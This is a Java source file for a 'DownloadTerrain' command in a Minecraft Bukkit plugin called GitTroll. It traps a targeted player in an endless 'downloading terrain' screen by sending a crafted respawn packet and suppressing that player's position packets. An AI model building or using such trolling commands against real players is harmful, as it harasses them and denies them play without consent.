package net.Lenni0451.GitTroll.command.commands.trolling;

import java.util.ArrayList;
import java.util.List;

import org.bukkit.event.EventHandler;
import org.bukkit.event.player.PlayerQuitEvent;

import net.Lenni0451.GitTroll.command.CommandBase;
import net.Lenni0451.GitTroll.event.EventListener;
import net.Lenni0451.GitTroll.event.events.EventServerPacket;
import net.Lenni0451.GitTroll.event.types.Event;
import net.Lenni0451.GitTroll.utils.ArrayHelper;
import net.Lenni0451.GitTroll.utils.CustomPlayer;
import net.minecraft.server.v1_8_R3.EnumDifficulty;
import net.minecraft.server.v1_8_R3.PacketPlayOutPosition;
import net.minecraft.server.v1_8_R3.PacketPlayOutRespawn;
import net.minecraft.server.v1_8_R3.WorldSettings.EnumGamemode;
import net.minecraft.server.v1_8_R3.WorldType;

public class DownloadTerrain extends CommandBase implements EventListener {
	
	List<CustomPlayer> player = new ArrayList<>();

	public DownloadTerrain() {
		super("DownloadTerrain", "Let a player be stuck in an infinite download terrain screen", "<Player>");
	}

	@Override
	public void execute(CustomPlayer executor, ArrayHelper args) {
		if(args.isLength(1)) {
			CustomPlayer vic = this.parsePlayer(args.getString(0), executor);
			
			if(player.remove(vic)) {
				executor.sendGitMessage("§cThe screen has been closed.");
			} else {
				player.add(vic);
				vic.sendPacket(new PacketPlayOutRespawn(1, EnumDifficulty.PEACEFUL, WorldType.NORMAL, EnumGamemode.NOT_SET));
				executor.sendGitMessage("The player is now stuck in an infinite downloading terrain screen.");
			}
		} else {
			this.commandWrong();
		}
	}

	@Override
	public void tabComplete(List<String> tabComplete, ArrayHelper args) {
		if(args.isEmpty()) {
			this.tabCompletePlayers(tabComplete);
		}
	}

	@Override
	public void onEvent(Event event) {
		if(event instanceof EventServerPacket) {
			EventServerPacket e = (EventServerPacket) event;
			if(this.player.contains(CustomPlayer.instanceOf(e.getPlayer()))) {
				if(e.getPacket() instanceof PacketPlayOutPosition) {
					((EventServerPacket) event).setCancelled(true);
				}
			}
		}
	}
	
	@EventHandler
	public void onDisconnect(PlayerQuitEvent event) {
		CustomPlayer player = CustomPlayer.instanceOf(event.getPlayer());
		this.player.remove(player);
	}

}
